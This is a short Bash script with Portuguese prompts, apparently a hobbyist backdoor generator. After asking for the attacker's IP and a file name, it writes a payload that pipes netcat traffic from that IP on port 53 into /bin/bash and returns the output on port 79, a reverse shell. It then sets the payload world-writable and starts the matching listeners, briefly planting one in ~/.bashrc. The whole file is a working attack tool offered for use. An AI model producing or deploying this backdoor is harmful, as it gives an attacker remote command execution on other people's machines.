#!/bin/bash
# Developer: Derxs
# Version: 1.0
if [ `whoami` == 'root' ];
then
Menu(){
clear
sleep 2
echo "
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMM        MMMMMMMMMMMM
MMMMMMMMMM            MMMMMMMMMM
MMMMMMMMM              MMMMMMMMM
MMMMMMMM                MMMMMMMM
MMMMMMM                 MMMMMMMM
MMMMMMM                  MMMMMMM
MMMMMMM                  MMMMMMM
MMMMMMM    MMM    MMM    MMMMMMM
MMMMMMM   MMMMM   MMMM   MMMMMMM
MMMMMMM   MMMMM   MMMM   MMMMMMM
MMMMMMMM   MMMM M MMMM  MMMMMMMM
MMVKMMMM        M        MMMMMMM
MMMMMMMM       MMM      MMMMMMMM
MMMMMMMMMMMM   MMM  MMMMMMMMMMMM
MMMMMMMMMM MM       M  MMMMMMMMM
MMMMMMMMMM  M M M M M MMMMMMMMMM
MMMM  MMMMM MMMMMMMMM MMMMM   MM
MMM    MMMM M MMMMM M MMMM    MM
MMM    MMMM   M M M  MMMMM   MMM
MMMM    MMMM         MMM      MM
MMM       MMMM     MMMM       MM
MMM         MMMMMMMM      M  MMM
MMMM  MMM      MMM      MMMMMMMM
MMMMMMMMMMM  MM       MMMMMMM  M
MMM  MMMMMMM       MMMMMMMMM   M
MM    MMM        MM            M
MM            MMMM            MM
MMM        MMMMMMMMMMMMM       M
MM      MMMMMMMMMMMMMMMMMMM    M
MMM   MMMMMMMMMMMMMMMMMMMMMM   M
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
"
sleep 2
echo -n "[+] Digite o seu IP: "
read ip
if [ "$ip" == "" ];
then
	echo "[!] Você precisa digitar o seu número de IP!"
	sleep 4
	Menu
else
	echo -n "[+] Digite o nome para a backdoor: "
	read nome
	if [ "$nome" == "" ];
	then
		echo "[!] Você precisa digitar um nome!"
		sleep 4
		Menu
	else
		echo "#!/bin/bash" >> $nome.sh
		echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
		chmod 777 $nome.sh
		clear
		echo "[+] Backdoor criada com sucesso!"
		sleep 2
		echo nc -l -n -p 79 -vv >> ~/.bashrc
		x-terminal-emulator
		sed -i '/nc -l -n -p 79/d' ~/.bashrc
		nc -l -n -p 53 -vv
	fi
fi
}
Menu
else
	echo ""
    	echo "[!] Por favor execute o script como root!"
	echo ""
	exit
fi
